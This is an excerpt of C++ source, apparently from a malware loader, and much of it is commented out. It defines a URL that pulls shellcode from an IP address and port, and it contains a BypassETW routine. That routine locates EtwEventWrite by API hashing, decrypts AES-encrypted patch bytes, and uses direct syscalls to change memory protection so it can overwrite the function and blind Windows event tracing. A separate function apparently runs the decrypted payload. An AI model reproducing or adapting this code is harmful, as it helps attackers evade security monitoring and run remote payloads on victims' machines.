...
//static const char* SHELLCODE_URL = "http://172.31.239.133:23023/calc_huffloader.bin";
...
//void BypassETW(HMODULE module, int* check_status) {
//    //printf("OKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK");
//    WORD syscallNum;
//    LPVOID addr = NULL;
//
//    LPVOID pEtwEventWrite = getAPIAddr(module, 0x128423f0); // Hash of EtwEventWrite
//
//    //if ((syscallNum = FindAmmunitionsAndPrepareGun(pEtwEventWrite)) == INVALID_SSN)
//    //{
...
//    SIZE_T size = 5;
//
//    //BYTE patchBytes[] = { 0x50, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc0, 0x03, 0x58, 0xc3 };
//    BYTE encryptedPatchBytes[] = { 0xd2, 0xc7, 0xa3, 0xbc, 0x56, 0x9c, 0xe4, 0x1b, 0x46, 0x00, 0xb9, 0x0d, 0x69, 0x78, 0x68, 0xe7 };
//	size = sizeof(encryptedPatchBytes);
//
//
//	// Decrypt the patch bytes using AES
//    std::vector<BYTE> encryptedVector;
//    encryptedVector.assign(encryptedPatchBytes, encryptedPatchBytes + size);
//
//	std::vector<BYTE> decryptedVector;
//    std::vector<BYTE> decrypted = AESDecryptor::aes_decrypt(encryptedVector, (char*)AESKeyEtW, (char*)AESIVEtw);
//
//    BYTE* patchBytes = decrypted.data();
//
//	// print(STATUS, "[+] Decrypting patch bytes...\n");
//
...
//
//	// Temporarily change the protection of the EtwEventWrite function
//    NTSTATUS NtProtectStatus = GunFire(NtCurrentProcess(), &pEtwEventWrite, (PSIZE_T)&size, PAGE_EXECUTE_READWRITE, &OldProtect);
...
//        ((PBYTE)pEtwEventWrite)[i] = ((PBYTE)patchBytes)[i];
//    
//
//
//
//	// Restore the original protection of the EtwEventWrite function
//    pEtwEventWrite = getAPIAddr(module, 0x128423f0); // Hash of EtwEventWrite
//    size = sizeof(patchBytes);
//
//    addr = getAPIAddr(module, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
//    if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
//    {
...
//    NtProtectStatus = GunFire(NtCurrentProcess(), &pEtwEventWrite, (PSIZE_T)&size, OldProtect, &OldProtect);
//    if (!NT_SUCCESS(NtProtectStatus)) {
...
//	*check_status = 0; // Set status to indicate success
//    return;
//
//
...
void nquangit_huffrun(std::vector<BYTE>& decrypted, int * run_status) {
    ...
    */
    ...
    //BYTE* patchBytes = decryptedVector.data();
	//BYTE* patchBytes = new BYTE[decryptedVector.size()];
    //std::copy(decryptedVector.begin(), decryptedVector.end(), patchBytes);
    //patchBytes = decryptedVector.data();
